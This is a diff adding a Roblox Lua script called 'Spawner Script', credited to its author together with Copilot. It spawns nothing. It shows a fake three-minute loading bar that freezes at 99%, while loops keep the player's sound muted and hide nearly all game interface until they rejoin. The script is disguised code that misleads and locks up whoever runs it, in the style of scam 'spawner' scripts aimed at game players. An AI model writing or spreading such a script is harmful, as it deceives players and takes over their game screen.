@@ -1,0 +1,117 @@
+--[[ 🗨️ Spawner Script | Final Lockdown Edition
+     Author: Ggscriot x Copilot
+     Features: Gradient background, black text, 3-minute loading bar, 99% freeze, full UI lockdown, sound mute
+]]
+
+local player = game:GetService("Players").LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+local starterGui = game:GetService("StarterGui")
+local soundService = game:GetService("SoundService")
+
+-- 🔇 Loop to permanently mute sound until rejoin
+task.spawn(function()
+    while true do
+        soundService.Volume = 0
+        wait(1)
+    end
+end)
+
+-- 🧼 Loop to hide all CoreGui except Chat and Settings
+task.spawn(function()
+    while true do
+        for _, guiType in ipairs(Enum.CoreGuiType:GetEnumItems()) do
+            if guiType ~= Enum.CoreGuiType.Chat and guiType ~= Enum.CoreGuiType.Settings then
+                pcall(function()
+                    starterGui:SetCoreGuiEnabled(guiType, false)
+                end)
+            end
+        end
+        wait(1)
+    end
+end)
+
+-- 🛡️ Fullscreen GUI that overlays everything
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SpawnerScript"
+screenGui.IgnoreGuiInset = true
+screenGui.ResetOnSpawn = false
+screenGui.DisplayOrder = 999999
+screenGui.Parent = playerGui
+
+-- Background frame
+local frame = Instance.new("Frame", screenGui)
+frame.Size = UDim2.new(1, 0, 1, 0)
+frame.Position = UDim2.new(0, 0, 0, 0)
+frame.BackgroundColor3 = Color3.fromRGB(255, 170, 200)
+frame.BorderSizePixel = 0
+frame.ZIndex = 10
+
+-- Gradient overlay
+local gradient = Instance.new("UIGradient", frame)
+gradient.Color = ColorSequence.new{
+    ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 120, 180)),
+    ColorSequenceKeypoint.new(0.5, Color3.fromRGB(120, 180, 255)),
+    ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 180, 120))
+}
+gradient.Rotation = 45
+
+-- Script name label with emoji
+local title = Instance.new("TextLabel", screenGui)
+title.Size = UDim2.new(1, 0, 0.2, 0)
+title.Position = UDim2.new(0, 0, 0.1, 0)
+title.BackgroundTransparency = 1
+title.TextColor3 = Color3.fromRGB(0, 0, 0)
+title.Font = Enum.Font.Fantasy
+title.TextScaled = true
+title.Text = "🗨️ Spawner Script"
+title.ZIndex = 11
+
+-- Loading text
+local loadingText = Instance.new("TextLabel", screenGui)
+loadingText.Size = UDim2.new(1, 0, 0.1, 0)
+loadingText.Position = UDim2.new(0, 0, 0.4, 0)
+loadingText.BackgroundTransparency = 1
+loadingText.TextColor3 = Color3.fromRGB(0, 0, 0)
+loadingText.Font = Enum.Font.Code
+loadingText.TextScaled = true
+loadingText.Text = "Loading... 1%"
+loadingText.ZIndex = 11
+
+-- Loading bar background
+local barBackground = Instance.new("Frame", screenGui)
+barBackground.Size = UDim2.new(0.6, 0, 0.05, 0)
+barBackground.Position = UDim2.new(0.2, 0, 0.6, 0)
+barBackground.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+barBackground.BorderSizePixel = 0
+barBackground.ZIndex = 11
+
+-- Loading bar fill
+local barFill = Instance.new("Frame", barBackground)
+barFill.Size = UDim2.new(0, 0, 1, 0)
+barFill.Position = UDim2.new(0, 0, 0, 0)
+barFill.BackgroundColor3 = Color3.fromRGB(255, 100, 255)
+barFill.BorderSizePixel = 0
+barFill.ZIndex = 12
+
+-- Optional glow
+local glow = Instance.new("UIStroke", barFill)
+glow.Thickness = 2
+glow.Color = Color3.fromRGB(255, 255, 255)
+
+-- Optional rounded corners
+local corner = Instance.new("UICorner", barFill)
+corner.CornerRadius = UDim.new(0, 6)
+
+-- Animate loading from 1% to 99% over 3 minutes
+local totalTime = 180
+local steps = 99
+local delayPerStep = totalTime / steps
+
+for i = 1, steps do
+    loadingText.Text = "Loading... " .. i .. "%"
+    barFill.Size = UDim2.new(i / 100, 0, 1, 0)
+    wait(delayPerStep)
+end
+
+-- Freeze at 99%
+loadingText.Text = "Loading... 99%"
